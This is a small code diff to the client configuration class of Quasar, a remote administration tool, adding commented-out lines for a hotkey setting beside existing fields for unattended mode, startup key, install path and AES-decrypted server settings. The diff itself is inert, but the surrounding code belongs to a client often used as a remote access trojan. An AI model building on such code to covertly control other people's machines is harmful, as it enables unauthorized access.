@@ -38,6 +38,7 @@ namespace Quasar.Client.Config
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
         public static bool UNATTENDEDMODE = true;
+        //public static string HOTKEYVALUE = "Ctrl+Alt+K";
 
         public static bool Initialize()
         {
@@ -69,6 +70,7 @@ namespace Quasar.Client.Config
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
         public static bool UNATTENDEDMODE = false;
+        //public static string HOTKEYVALUE = "";
 
         public static bool Initialize()
         {
@@ -83,6 +85,7 @@ namespace Quasar.Client.Config
             STARTUPKEY = aes.Decrypt(STARTUPKEY);
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
+            //HOTKEYVALUE = aes.Decrypt(HOTKEYVALUE);
             SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
             SetupPaths();
             return VerifyHash();
